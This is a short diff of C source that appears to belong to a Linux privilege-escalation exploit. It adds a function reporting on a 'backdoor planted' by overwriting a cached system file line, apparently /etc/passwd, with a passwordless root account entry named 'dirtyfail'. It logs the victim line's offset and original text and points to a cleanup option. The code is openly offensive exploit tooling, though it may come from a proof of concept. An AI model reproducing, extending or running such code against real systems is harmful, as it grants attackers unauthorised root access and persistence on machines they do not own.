@@ -167,6 +167,24 @@ static bool load_state(off_t *line_off, char *victim_line, size_t cap, size_t *l
     return true;
 }
 
+/* Describe state file if present, for `--list-state`. Returns true if a
+ * backdoor state file was found and described, false if absent. */
+bool backdoor_list_state(void)
+{
+    off_t off = 0;
+    char  victim[2048];
+    size_t len = 0;
+    if (!load_state(&off, victim, sizeof(victim), &len))
+        return false;
+    log_warn("backdoor planted — state file %s", STATE_FILE);
+    log_hint("  victim line was at offset %lld (%zu bytes)",
+             (long long)off, len);
+    log_hint("  original line: %s", victim);
+    log_hint("  the page cache currently has 'dirtyfail::0:0:...:/:/bin/bash'");
+    log_hint("  in place of the above. Revert with `--cleanup-backdoor`.");
+    return true;
+}
+
 /* ---- byte-flip helper ----------------------------------------------- *
  *
  * For each char position where `cur[i] != target[i]`, call the
